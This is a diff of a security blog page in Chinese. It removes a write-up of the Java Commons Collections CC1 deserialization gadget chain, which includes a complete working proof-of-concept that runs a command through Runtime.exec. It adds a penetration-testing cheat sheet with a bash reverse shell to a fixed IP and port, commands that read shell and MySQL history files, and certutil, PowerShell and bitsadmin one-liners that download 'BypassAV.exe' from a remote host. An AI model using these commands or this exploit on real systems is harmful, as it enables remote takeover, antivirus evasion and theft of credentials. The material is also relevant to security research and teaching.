@@ -4,8 +4,14 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="Java反序列化-cc1链, jokerscar&#39;blogs">
-    <meta name="description" content="Commons Collections简介Apache Commons Collections是一个扩展了JAVA标准库里的Collection结构的第三方基础库，它提供了很多强有力的数据结构类型并且实现了各种集合工具类。作为Apache开">
+    <meta name="keywords" content="常用记不住的命令(补充ing), jokerscar&#39;blogs">
+    <meta name="description" content="
+Metasploit
+生成木马
+meterpreter配置静态路由run autoroute -s 10.xx.xx.xx&amp;#x2F;24
+
+Linux
+反弹shellbash:bash -i &amp;gt;&amp;amp; &amp;#x2F;dev&amp;#x">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -17,7 +23,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>Java反序列化-cc1链 | jokerscar&#39;blogs</title>
+    <title>常用记不住的命令(补充ing) | jokerscar&#39;blogs</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -287,12 +293,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/1.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/14.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">Java反序列化-cc1链</h1>
+                    <h1 class="description center-align post-title">常用记不住的命令(补充ing)</h1>
                 </div>
             </div>
         </div>
@@ -406,33 +412,12 @@
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                    <div class="article-tag">
-                        
-                            <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/">
-                                <span class="chip bg-color">反序列化利用链</span>
-                            </a>
-                        
-                            <a href="/tags/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
-                                <span class="chip bg-color">Java代码审计</span>
-                            </a>
-                        
-                    </div>
+                          <div class="article-tag">
+                            <span class="chip bg-color">无标签</span>
+                          </div>
                     
                 </div>
                 <div class="col s5 right-align">
-                    
-                    <div class="post-cate">
-                        <i class="fas fa-bookmark fa-fw icon-category"></i>
-                        
-                            <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="post-category">
-                                漏洞分析
-                            </a>
-                        
-                            <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/" class="post-category">
-                                反序列化利用链
-                            </a>
-                        
-                    </div>
                     
                 </div>
             </div>
@@ -462,114 +447,31 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="Commons-Collections简介"><a href="#Commons-Collections简介" class="headerlink" title="Commons Collections简介"></a>Commons Collections简介</h2><p>Apache Commons Collections是一个扩展了JAVA标准库里的Collection结构的第三方基础库，它提供了很多强有力的数据结构类型并且实现了各种集合工具类。作为Apache开源项目的重要组件，Commons Collections被广泛应用于各种Java应用的开发。</p>
-<h2 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a>Transformer</h2><p>cc1链中常见的利用路线有两种，分别是TransformedMap链和LazyMap链，触发的方式基本相同，这里我们重点分析TransformedMap链。</p>
-<p><img src="/2022/03/12/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc1%E9%93%BE/wps7BDA.tmp.jpg" alt="img"></p>
-<p>但不管TransformedMap利用链还是LazyMap利用链其实核心都是在调用实现了transformer接口的关键函数所构成的，在构造transformer反射利用链前可以关注一下transformer接口在源码注释中解释作用是将输入的对象转换成输出的对象。而构造利用链就需要用到实现了Transformer接口并重写了该接口中的transform函数，分别是ConstantTransformer，invokerTransformer，ChainedTransformer。</p>
-<h3 id="invokerTransformer"><a href="#invokerTransformer" class="headerlink" title="invokerTransformer"></a>invokerTransformer</h3><p>首先从invokerTransformer开始分析，以下是invokerTransformer的构造函数写transform()函数的主要内容。</p>
-<p><img src="/2022/03/12/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc1%E9%93%BE/wps7BDB.tmp.jpg" alt="img"></p>
-<p>transform函数的功能简单描述一下就是通过java的反射机制调用input对象中的指定函数，函数名和参数类型分别是invokerTransformer对象实例化时传入的iMethodName和iParamTypes，利用传入的函数名和参数可控这点我们可以构造一个恶意的transform链来达成任意代码执行的效果。</p>
-<h3 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h3><p>接着再来看看ConstantTransformer类</p>
-<p><img src="/2022/03/12/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc1%E9%93%BE/wps7BDC.tmp.jpg" alt="img"></p>
-<p>从上面ConstantTransformer类的构造函数可以看到，当ConstantTransformer的对象实例化时会将传入的对象赋值给成员属性iConstant，而这个属性在重写的transform函数被调用时返回。</p>
-<h3 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h3><p>还是重点来关注ChainedTransformer类中的构造函数和重写的transform函数</p>
-<p><img src="/2022/03/12/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc1%E9%93%BE/wps7BDD.tmp.jpg" alt="img"></p>
-<p>我们可以看到传入进ChainedTransformer的参数是transform类型的数组，然后在ChainedTransformer对象实例化时会将传入的这个数组赋值给成员变量iTransformers在调用transform()函数时会将iTransformers数组内的每个transform对象的transform()函数调用一遍。读起来有点绕口是吗，这个反射链执行的其实是((Runtime) Runtime.class.getMethod(“getRuntime”).invoke(“null”)).exec(“calc.exe”);</p>
-<p><img src="/2022/03/12/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc1%E9%93%BE/wps7BDE.tmp.jpg" alt="img"></p>
-<p>运行如图所示的demo可以看到成功的弹出了计算器，</p>
-<p>现在利用链有了，下一步要做的就是去找反序列化漏洞的触发点。目前已知java反序列化漏洞利用的核心是可序列化对象重写readObject函数并定义了一些危险的操作（例如调用Runtime类的exec执行系统命令）。而从上述的demo1中可以发现我们还需要的是在TransformedMap中可以调用到ChainedTransformer的transform函数机会。接下来的重点就是找触发transform函数和重写readObject函数的方式。</p>
-<h2 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h2><p>commons-collections组件中有两个实现了Serializable接口的类，分别是LazyMap和TransformedMap，也就是cc链中常用的两个类。</p>
-<p>TransformedMap类是Java标准数据结构Map接口的一个扩展。该类可以在一个元素被加入到集合内时，自动对该元素进行特定的修饰变换，具体的变换逻辑由Transformer类定义，Transformer在TransformedMap实例化时作为参数传入。</p>
-<p>首先从TransformedMap源码入手</p>
-<p><img src="/2022/03/12/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc1%E9%93%BE/wps7BDF.tmp.jpg" alt="img"></p>
-<p>​    可以看到在TransformedMap中有三个调用到transform的函数transfomKey()、transformValue()和checkSetValue()。这三个函数都是protected属性无法在外部直接被访问，但可以看到checkSetValue的注释中有下图中这样一段话，也就是说当TransformedMap的对象作为map被调用setvalue函数时触发的实际上是checkSetValue()。因此我们后面需要做的就是想办法调用到setvalue()函数。</p>
-<p><img src="/2022/03/12/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc1%E9%93%BE/wps7BE0.tmp.jpg" alt="img"></p>
-<p>另外在TransformedMap类中还有一个decorate()函数，decorate()函数会根据TransformedMap的构造函数中传入的参数返回一个TransformedMap对象。</p>
-<p><img src="/2022/03/12/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc1%E9%93%BE/wps7BE1.tmp.jpg" alt="img"></p>
-<h2 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h2><p>触发transform函数的方式已经建立好了，下面需要做的是重写了readObject()函数调用到TransformedMap对象的setValue()函数，从知名反序列化工具<a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial"> <em><strong>*ysoserial*</strong></em></a>的源码中可以看到作者选择了AnnotationInvocationHandler这个类来重写readObject。</p>
-<p><img src="/2022/03/12/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc1%E9%93%BE/wps7BF1.tmp.jpg" alt="img"></p>
-<p>AnnotationInvocationHandler是jdk下sun.reflect.annotation包中的一个类它实现了Serializable接口重写readObject()，其中还存在一个map属性的成员变量，在构造利用链时需要做的就是在AnnotationInvocationHandler实例化时将前面构造好的TransformedMap赋值个这个memberValues。但值得注意的是java8u71之后的版本修改了readObject不能利用。</p>
-<p><img src="/2022/03/12/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc1%E9%93%BE/wps7BF2.tmp.jpg" alt="img"></p>
-<p>版本高一点的jdk在AnnotationInvocationHandler的readobject函数可读性很差且不能利用，观察jdk1.7版本中AnnotationInvocationHandler重写的readObject函数。</p>
-<p>private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException {</p>
-<p>  var1.defaultReadObject();</p>
-<p>  AnnotationType var2 &#x3D; null;</p>
-<p>  try {</p>
-<p>​    var2 &#x3D; AnnotationType.getInstance(this.type);</p>
-<p>  } catch (IllegalArgumentException var9) {</p>
-<p>​    throw new InvalidObjectException(“Non-annotation type in annotation serial stream”);</p>
-<p>  }</p>
-<p>  Map var3 &#x3D; var2.memberTypes();</p>
-<p>  Iterator var4 &#x3D; this.memberValues.entrySet().iterator();</p>
-<p>  while(var4.hasNext()) {</p>
-<p>​    Entry var5 &#x3D; (Entry)var4.next();</p>
-<p>​    String var6 &#x3D; (String)var5.getKey();</p>
-<p>​    Class var7 &#x3D; (Class)var3.get(var6);</p>
-<p>​    if (var7 !&#x3D; null) {</p>
-<p>​      Object var8 &#x3D; var5.getValue();</p>
-<p>​      if (!var7.isInstance(var8) &amp;&amp; !(var8 instanceof ExceptionProxy)) {</p>
-<p>​        var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + “[“ + var8 + “]”)).setMember((Method)var2.members().get(var6)));</p>
-<p>​      }</p>
-<p>​    }</p>
-<p>  }</p>
-<p>}</p>
-<p>简单解释以下就是获取AnnotationInvocationHandler实例化的对象中的成员变量memberValues对其迭代。而下面这段代码正是我们需要用到的调用setValue()。</p>
-<p><img src="/2022/03/12/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc1%E9%93%BE/wps7BF3.tmp.jpg" alt="img"></p>
-<p>在源码中可以看到AnnotationInvocationHandler类的访问权限不是public，因此只能通过反射的方式获取到对象。</p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h3 id="利用链流程："><a href="#利用链流程：" class="headerlink" title="利用链流程："></a>利用链流程：</h3><p>通过Transformer[] transformers &#x3D; new Transformer[]{}构造恶意transformers数组—&gt;将Transformer数组传入transformerChain方便调用数组内的每一个transform函数—&gt;创建map，调用TransformedMap中的decorate将transformerChain传入并返回TransformedMap对象—&gt;通过反射实例化AnnotationInvocationHandler并将TransformedMap传个生成的对象调用readObject()触发checkSetValue()—&gt;序列化—&gt;反序列化触发漏洞</p>
-<h3 id="poc："><a href="#poc：" class="headerlink" title="poc："></a>poc：</h3><p>import java.io.*;</p>
-<p>import java.util.HashMap;</p>
-<p>import java.util.Map;</p>
-<p>import org.apache.commons.collections.Transformer;</p>
-<p>import org.apache.commons.collections.functors.ChainedTransformer;</p>
-<p>import org.apache.commons.collections.functors.ConstantTransformer;</p>
-<p>import org.apache.commons.collections.functors.InvokerTransformer;</p>
-<p>import java.lang.reflect.Constructor;</p>
-<p>import java.lang.annotation.Target;</p>
-<p>import org.apache.commons.collections.map.TransformedMap;</p>
-<p>public class test {</p>
-<p>  public static void main(String[] args) throws Exception{</p>
-<p>​    &#x2F;&#x2F;核心利用代码</p>
-<p>​    Transformer[] transformers &#x3D; new Transformer[]{</p>
-<p>​        new ConstantTransformer(Runtime.class),</p>
-<p>​        new InvokerTransformer(“getMethod”, new Class[]{String.class, Class[].class}, new Object[]{“getRuntime”, new Class[0]}),</p>
-<p>​        new InvokerTransformer(“invoke”, new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),</p>
-<p>​        new InvokerTransformer(“exec”, new Class[]{String.class}, new Object[]{“calc.exe”})</p>
-<p>​    };</p>
-<p>​    &#x2F;&#x2F;将数组transformers传给ChainedTransformer，构造利用链</p>
-<p>​    Transformer transformerChain &#x3D; new ChainedTransformer(transformers);</p>
-<p>​    &#x2F;&#x2F;触发漏洞</p>
-<p>​    Map map &#x3D; new HashMap();</p>
-<p>​    map.put(“value”, “test”);</p>
-<p>​    &#x2F;&#x2F;通过反射触发利用链</p>
-<p>​    Map transformedMap &#x3D; TransformedMap.decorate(map, null, transformerChain);</p>
-<p>​    Class cl &#x3D; Class.forName(“sun.reflect.annotation.AnnotationInvocationHandler”);</p>
-<p>​    &#x2F;&#x2F;获得AnnotationInvocationHandler的构造器</p>
-<p>​    Constructor ctor &#x3D; cl.getDeclaredConstructor(Class.class, Map.class);</p>
-<p>​    ctor.setAccessible(true);</p>
-<p>​    &#x2F;&#x2F;将transformedMap传给AnnotationInvocationHandler的构造</p>
-<p>​    Object instance&#x3D;ctor.newInstance(Target.class, transformedMap);</p>
-<p>​    &#x2F;&#x2F;序列化</p>
-<p>​    FileOutputStream fileOutputStream &#x3D; new FileOutputStream(“serialize.ser”);</p>
-<p>​    ObjectOutputStream objectOutputStream &#x3D; new ObjectOutputStream(fileOutputStream);</p>
-<p>​    objectOutputStream.writeObject(instance);</p>
-<p>​    objectOutputStream.close();</p>
-<p>​    &#x2F;&#x2F;反序列化</p>
-<p>​    FileInputStream fileInputStream &#x3D; new FileInputStream(“serialize.ser”);</p>
-<p>​    ObjectInputStream objectInputStream &#x3D; new ObjectInputStream(fileInputStream);</p>
-<p>​    Object result &#x3D; objectInputStream.readObject();</p>
-<p>​    objectInputStream.close();</p>
-<p>  }</p>
-<p>}</p>
-<p>在jdk1.7版本下运行上述demo可观察到成功执行构造的恶意代码</p>
-<p><img src="/2022/03/12/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc1%E9%93%BE/wps7BF4.tmp.jpg" alt="img"></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_35733751/article/details/118387718">https://blog.csdn.net/qq_35733751/article/details/118387718</a></p>
-<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/1034/">https://paper.seebug.org/1034/</a></p>
-<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/359194253">https://zhuanlan.zhihu.com/p/359194253</a></p>
-<p><a target="_blank" rel="noopener" href="https://security.tencent.com/index.php/blog/msg/97">https://security.tencent.com/index.php/blog/msg/97</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/yyhuni/p/14777166.html">https://www.cnblogs.com/yyhuni/p/14777166.html</a></p>
-<p><a target="_blank" rel="noopener" href="https://github.com/Maskhe/javasec/blob/master/3">https://github.com/Maskhe/javasec/blob/master/3</a>. apache commons-collections中的反序列化.md</p>
-<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/sraJ2K9R2CkLHiCcPK0wrA">https://mp.weixin.qq.com/s/sraJ2K9R2CkLHiCcPK0wrA</a></p>
+                <p><a name="iLCGg"></a></p>
+<h1 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h1><p><a name="eTVQI"></a></p>
+<h2 id="生成木马"><a href="#生成木马" class="headerlink" title="生成木马"></a>生成木马</h2><p><a name="YNDgL"></a></p>
+<h2 id="meterpreter"><a href="#meterpreter" class="headerlink" title="meterpreter"></a>meterpreter</h2><p>配置静态路由<br>run autoroute -s 10.xx.xx.xx&#x2F;24</p>
+<p><a name="ldlkw"></a></p>
+<h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><p><a name="aYBXY"></a></p>
+<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>bash:<br><strong>bash</strong> -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;<strong>192.168.65.128</strong>&#x2F;<strong>6767</strong> 0&gt;&amp;1<br>更多：<br><a target="_blank" rel="noopener" href="https://www.revshells.com/">https://www.revshells.com/</a><br><a name="O5ATS"></a></p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>是否在docker中<br>&#x2F;proc&#x2F;1&#x2F;cgroup</p>
+<p><strong>系统版本</strong><br>cat &#x2F;etc&#x2F;issue<br><em><strong>内核版本</strong></em><br>cat &#x2F;proc&#x2F;version<br><strong>环境变量</strong><br>cat &#x2F;etc&#x2F;profile<br><strong>开机自启</strong><br>cat &#x2F;etc&#x2F;crontab<br><strong>命令记录</strong><br>cat ~&#x2F;.bash_history<br>cat ~&#x2F;.nano_history<br>cat ~&#x2F;.atftp_history<br>cat ~&#x2F;.mysql_history<br>cat ~&#x2F;.php_history<br><a name="hsj6L"></a></p>
+<h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><p><a name="XuoyI"></a></p>
+<h2 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h2><p><a name="mTAZB"></a></p>
+<h2 id="下载文件"><a href="#下载文件" class="headerlink" title="下载文件"></a>下载文件</h2><p>certutil.exe -urlcache -split -f “<a href="http://ip:port/BypassAV.exe&quot;">http://ip:port/BypassAV.exe&quot;</a> bad.txt</p>
+<p>powershell Invoke-WebRequest -Uri <a href="http://ip:port/BypassAV.exe">http://ip:port/BypassAV.exe</a> -OutFile a.exe</p>
+<p>powershell Start-BitsTransfer -Source <a href="http://ip:port/BypassAV.exe">http://ip:port/BypassAV.exe</a> -Destination a.txt</p>
+<p>powershell (new-object System.Net.WebClient).DownloadFile(‘ip:port&#x2F;BypassAV.exe’, ‘a.exe’)</p>
+<p>bitsadmin &#x2F;transfer myDownLoadJob &#x2F;download &#x2F;priority normal “ip:port&#x2F;BypassAV.exe”</p>
+<p><a name="GVSlr"></a></p>
+<h1 id="mimikataz"><a href="#mimikataz" class="headerlink" title="mimikataz"></a>mimikataz</h1><p><a name="XIeE3"></a></p>
+<h1 id="CobaltStrike"><a href="#CobaltStrike" class="headerlink" title="CobaltStrike"></a>CobaltStrike</h1><p><a name="Lek0d"></a></p>
+<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p><a name="bjV99"></a></p>
+<h2 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h2><p><a name="gcejV"></a></p>
+<h2 id="SQLmap"><a href="#SQLmap" class="headerlink" title="SQLmap"></a>SQLmap</h2><p><a name="BxnNH"></a></p>
+<h1 id="Codeql"><a href="#Codeql" class="headerlink" title="Codeql"></a>Codeql</h1><p><a name="FWrQY"></a></p>
+<h1 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h1><p><a name="m4epA"></a></p>
+<h1 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h1><p><a target="_blank" rel="noopener" href="https://0range-x.github.io/2022/01/26/Domain-penetration_one-stop/">https://0range-x.github.io/2022/01/26/Domain-penetration_one-stop&#x2F;</a></p>
 
                 
             </div>
@@ -596,7 +498,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2022/03/12/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc1%E9%93%BE/">http://example.com/2022/03/12/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc1%E9%93%BE/</a>
+                    <a href="http://example.com/2022/03/12/%E5%B8%B8%E7%94%A8%E8%AE%B0%E4%B8%8D%E4%BD%8F%E7%9A%84%E5%91%BD%E4%BB%A4-%E8%A1%A5%E5%85%85ing/">http://example.com/2022/03/12/%E5%B8%B8%E7%94%A8%E8%AE%B0%E4%B8%8D%E4%BD%8F%E7%9A%84%E5%91%BD%E4%BB%A4-%E8%A1%A5%E5%85%85ing/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -633,15 +535,7 @@
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            
-                                <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/">
-                                    <span class="chip bg-color">反序列化利用链</span>
-                                </a>
-                            
-                                <a href="/tags/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
-                                    <span class="chip bg-color">Java代码审计</span>
-                                </a>
-                            
+                            <span class="chip bg-color">无标签</span>
                         </div>
                     
                 </div>
@@ -691,13 +585,13 @@
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2022/03/12/DPAPI-leaning/">
+                <a href="/2022/03/12/fastjson%E6%BC%8F%E6%B4%9E-JdbcRowSetImpl%E9%93%BE/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/15.jpg" class="responsive-img" alt="DPAPI(leaning)">
+                        <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="fastjson漏洞-JdbcRowSetImpl链">
                         
-                        <span class="card-title">DPAPI(leaning)</span>
+                        <span class="card-title">fastjson漏洞-JdbcRowSetImpl链</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -714,12 +608,12 @@
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="post-category">
-                                    内网渗透
+                            <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="post-category">
+                                    漏洞分析
                                 </a>
                             
-                            <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows-API/" class="post-category">
-                                    Windows API
+                            <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/" class="post-category">
+                                    反序列化利用链
                                 </a>
                             
                             
@@ -729,16 +623,24 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/Windows-api/">
-                        <span class="chip bg-color">Windows api</span>
+                    <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
+                        <span class="chip bg-color">漏洞分析</span>
                     </a>
                     
-                    <a href="/tags/%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96/">
-                        <span class="chip bg-color">密码获取</span>
+                    <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/">
+                        <span class="chip bg-color">反序列化利用链</span>
                     </a>
                     
-                    <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">
-                        <span class="chip bg-color">内网渗透</span>
+                    <a href="/tags/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
+                        <span class="chip bg-color">Java代码审计</span>
+                    </a>
+                    
+                    <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">
+                        <span class="chip bg-color">反序列化漏洞</span>
+                    </a>
+                    
+                    <a href="/tags/JNDI%E6%B3%A8%E5%85%A5/">
+                        <span class="chip bg-color">JNDI注入</span>
                     </a>
                     
                 </div>
@@ -752,13 +654,13 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2022/03/12/hello-world/">
+                <a href="/2022/03/12/Liferay-Portal%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="Hello World">
+                        <img src="/medias/featureimages/9.jpg" class="responsive-img" alt="Liferay Portal反序列化">
                         
-                        <span class="card-title">Hello World</span>
+                        <span class="card-title">Liferay Portal反序列化</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -773,11 +675,31 @@
                             </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-user fa-fw"></i>
-                            jokerscar
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="post-category">
+                                    漏洞分析
+                                </a>
+                            
                             
                         </span>
                     </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
+                        <span class="chip bg-color">漏洞分析</span>
+                    </a>
+                    
+                    <a href="/tags/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
+                        <span class="chip bg-color">Java代码审计</span>
+                    </a>
+                    
+                    <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">
+                        <span class="chip bg-color">反序列化漏洞</span>
+                    </a>
+                    
                 </div>
                 
             </div>
